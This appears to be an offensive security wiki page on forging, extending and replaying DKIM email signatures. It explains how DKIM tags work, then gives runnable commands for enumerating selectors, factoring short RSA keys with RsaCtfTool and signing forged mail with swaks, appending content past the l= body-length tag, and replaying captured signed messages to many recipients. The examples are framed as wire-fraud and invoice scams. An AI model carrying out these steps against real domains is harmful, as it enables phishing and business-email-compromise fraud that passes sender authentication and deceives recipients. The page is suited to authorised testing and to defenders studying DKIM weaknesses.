---
title: "DKIM: forging, appending to, and replaying DomainKeys signatures"
description: "Reading a DKIM-Signature header and the selector's published key to find the gap: no signing at all, a short factorable RSA key, a l= body-length tag that allows content append, a replayable signed message, or a stale selector. Includes dig fingerprinting, key-length extraction, append, and replay."
keywords:
  - DKIM
  - DKIM-Signature
  - selector
  - l= body length tag
  - DKIM replay
  - weak DKIM key
---

# DKIM

DKIM attaches a cryptographic signature to outbound mail so a receiver can verify the message was authorized by the signing domain and that the signed parts were not altered in transit. The sender adds a `DKIM-Signature:` header; the receiver fetches the public key from DNS and verifies. Unlike SPF, DKIM is tied to the message content rather than the connecting IP, which is exactly what makes its failure modes useful: a signature can be too weak to trust, can leave part of the message unsigned, or can be lifted intact and reused.

## Mechanism

The signer adds a header like:

```text
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.com; s=sel2024;
  h=from:to:subject:date; bh=<base64 body hash>; b=<base64 signature>
```

- `d=` is the signing domain, `s=` the selector. Together they locate the key at `s._domainkey.d` as a TXT record.
- `h=` lists exactly which headers are signed, in order. Anything not in `h=` is unsigned and can be changed or added freely.
- `bh=` is the hash of the (canonicalized) body; `b=` is the RSA/Ed25519 signature over the signed headers plus `bh=`.
- An optional `l=` tag gives the number of body octets covered by `bh=`. Body beyond that count is not hashed.

The published key looks like `v=DKIM1; k=rsa; p=<base64 DER public key>`. An empty `p=` means the key is revoked.

## Fingerprint

Get the selector from a `DKIM-Signature` in any mail you have received from the target (its `s=` tag), then pull and inspect the key:

```bash
dig +short TXT sel2024._domainkey.victim.com
# "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ..."
```

If no selector is known, enumerate common ones:

```bash
for s in default selector1 selector2 google k1 s1 s2 dkim mail smtp mandrill mta sig1 20230601; do
  r=$(dig +short TXT ${s}._domainkey.victim.com); [ -n "$r" ] && echo "${s} => ${r}"
done
```

Read the key length by wrapping the `p=` blob as a PEM public key and asking OpenSSL:

```bash
P='MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ...'   # the p= value, concatenated if split across strings
printf -- '-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----\n' "$P" \
  | openssl rsa -pubin -text -noout | head -1
# Public-Key: (768 bit)     <- 512/768-bit RSA is factorable; 1024 is weak, 2048 is standard
```

Decision points:

- **No key / `p=` empty** → the selector is revoked or the domain does not sign. No DKIM to pass means DMARC must lean entirely on SPF alignment; often the fastest route is still a `From:` spoof under a weak [DMARC](dmarc.md).
- **512 or 768-bit modulus** → factorable on commodity hardware. Recover the private key and you can mint signatures that verify, giving you a DKIM-aligned pass as the domain.
- **`l=` present in signatures from this domain** → body append is possible (below).
- **Stale/test selector still resolving** → development keys left in DNS are frequently short or their private half has leaked in old repos; worth checking selectors like `test`, `dev`, `k1`.

## Worked: forge a signature from a short key

If the modulus is 512 or 768-bit, factor it, rebuild the private key, and sign your own message as the domain. Extract the modulus, factor with a number-field sieve (CADO-NFS or msieve/yafu), then reconstruct the key:

```bash
# modulus in hex from the published key
printf -- '-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----\n' "$P" \
  | openssl rsa -pubin -modulus -noout        # Modulus=... (and -text shows exponent 65537)
# factor N into p,q (CADO-NFS), then with p,q,e reconstruct d and emit a private key (RsaCtfTool automates this)
python3 RsaCtfTool.py --publickey dkim.pub --uncipher none --private  # yields private.pem on success
# sign a crafted message with the recovered key and the real selector
swaks --to target@recipient.com --from ceo@victim.com \
      --header "Subject: Wire update" --body "..." \
      --server mx.recipient.com \
      --sign-with private.pem --sign-selector sel2024 --sign-domain victim.com
```

A verifying receiver fetches the live public key, checks your `b=` against it, and reports `dkim=pass d=victim.com`, which then aligns for DMARC.

## Worked: append past the l= tag

When a domain signs with `l=`, only the first `l=` body octets are hashed into `bh=`. Capture one legitimately signed message from the domain, keep its headers and `DKIM-Signature` byte-for-byte, and append your content after the signed prefix. The signature still verifies over the first `l=` octets; everything after is attacker-controlled and rendered by the client:

```bash
# raw.eml is a signed message you received; note l=NNN in its DKIM-Signature
grep -o 'l=[0-9]*' raw.eml
# keep the signed prefix intact, append new body, then resend the raw message unchanged in its signed region
printf '\n\n--- Updated instructions below ---\nPay invoice to ...\n' >> raw.eml
swaks --to target@recipient.com --server mx.recipient.com --data raw.eml
```

Mail clients that show the full body display the appended text as part of a `dkim=pass` message. Canonicalization matters: `c=simple/simple` is unforgiving about whitespace, `relaxed` body canonicalization tolerates trailing-whitespace and line-folding changes, so append cleanly after the last signed octet.

## Worked: replay a signed message

DKIM signs headers and body but not the envelope recipient or the connecting IP. A single legitimately signed message is therefore valid no matter who sends it onward or to whom, until the key rotates. Obtain one signed message from the domain (send yourself mail from an account on it, or capture one), then re-inject the raw message, DKIM-Signature included, to new recipients:

```bash
# resend the captured, signed message verbatim to a different target; d= still aligns, signature still valid
swaks --to many.targets@recipient.com --from bounce@victim.com \
      --server mx.recipient.com --data signed-original.eml
```

The content is fixed (you cannot change signed headers or the signed body region without breaking `b=`), so replay is used to ride a domain's good reputation for bulk delivery and to pass DMARC on a message the domain really signed.

## Follow-on

A `dkim=pass` that aligns to the `From:` domain satisfies DMARC on its own, so a forged or replayed signature is frequently the cleanest spoof against a domain with `p=reject`. Confirm the alignment mode on the [DMARC](dmarc.md) page, then assemble and send on [Sender spoofing](sender-spoofing.md).

## Tools

- [swaks](https://github.com/jetmore/swaks)
- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
- [dkimpy (dkimverify / dknewkey)](https://launchpad.net/dkimpy)

## References

- [RFC 6376 (DomainKeys Identified Mail)](https://datatracker.ietf.org/doc/html/rfc6376)
- [RFC 6376 section 3.5 (the l= body length tag)](https://datatracker.ietf.org/doc/html/rfc6376#section-3.5)
- [Zach Harris: weak DKIM keys forgeable (Wired writeup)](https://www.wired.com/2012/10/dkim-vulnerability-widespread/)
